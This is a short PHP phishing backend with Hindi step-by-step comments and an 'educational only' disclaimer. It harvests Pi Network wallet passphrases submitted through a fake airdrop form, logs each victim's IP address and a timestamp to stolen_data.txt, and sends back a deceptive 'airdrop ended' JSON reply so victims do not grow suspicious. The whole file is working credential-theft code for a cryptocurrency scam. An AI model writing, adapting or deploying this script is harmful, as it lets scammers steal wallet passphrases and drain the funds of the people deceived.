<?php

// ======================================================================
// चेतावनी: यह स्क्रिप्ट केवल शैक्षिक उद्देश्यों के लिए है।
// इसका किसी भी अवैध गतिविधि के लिए उपयोग करना एक अपराध है।
// ======================================================================

// चरण 1: जाँच करें कि क्या 'your-password' नाम का डेटा POST रिक्वेस्ट के माध्यम से भेजा गया है।
// 'isset()' यह सुनिश्चित करता है कि स्क्रिप्ट तभी चले जब डेटा भेजा गया हो।
if (isset($_POST['your-password'])) {

    // चरण 2: भेजे गए डेटा को प्राप्त करें और उसे साफ करें।
    // 'trim()' फ़ंक्शन आगे-पीछे के फालतू स्पेस को हटा देता है।
    $passphrase = trim($_POST['your-password']);

    // चरण 3: हमलावर अतिरिक्त जानकारी भी इकट्ठा करते हैं।
    // पीड़ित का IP पता प्राप्त करें।
    $ip_address = $_SERVER['REMOTE_ADDR'];
    // जिस समय डेटा चोरी हुआ, उसका समय रिकॉर्ड करें।
    $timestamp = date("Y-m-d H:i:s");

    // चरण 4: चोरी की गई जानकारी को एक लॉग फ़ाइल में लिखने के लिए तैयार करें।
    // PHP_EOL का मतलब है एक नई लाइन, ताकि हर एंट्री अलग-अलग लाइन पर आए।
    $log_entry = "Timestamp: " . $timestamp . " | IP Address: " . $ip_address . " | Passphrase: " . $passphrase . PHP_EOL;

    // चरण 5: सारी जानकारी को एक टेक्स्ट फ़ाइल में सहेजें।
    // 'file_put_contents' डेटा को फ़ाइल में लिखता है।
    // 'FILE_APPEND' यह सुनिश्चित करता है कि हर नई एंट्री फ़ाइल के अंत में जुड़े, न कि पुरानी को मिटा दे।
    file_put_contents('stolen_data.txt', $log_entry, FILE_APPEND);

    // चरण 6: ब्राउज़र को धोखा देने के लिए एक झूठा JSON जवाब भेजें।
    // यह वही संदेश है जो जावास्क्रिप्ट को चाहिए ताकि उपयोगकर्ता को लगे कि एयरड्रॉप समाप्त हो गया है।
    $response = [
        'status' => 'mail_sent', // यह जावास्क्रिप्ट को बताता है कि सबमिशन "सफल" रहा।
        'message' => 'This airdrop program has now ended. Pi Core Team reminds you: Only enter your passphrase in the official Pi app via Pi Browser—never share it elsewhere.'
    ];

    // ब्राउज़र को बताएं कि यह एक JSON जवाब है।
    header('Content-Type: application/json');
    // PHP ऐरे को JSON फॉर्मेट में बदलकर ब्राउज़र को भेजें।
    echo json_encode($response);

} else {
    // अगर कोई सीधे इस फ़ाइल को एक्सेस करने की कोशिश करता है, तो एक त्रुटि दिखाएं।
    header("HTTP/1.0 400 Bad Request");
    echo "Error: No data was sent to this script.";
}

?>
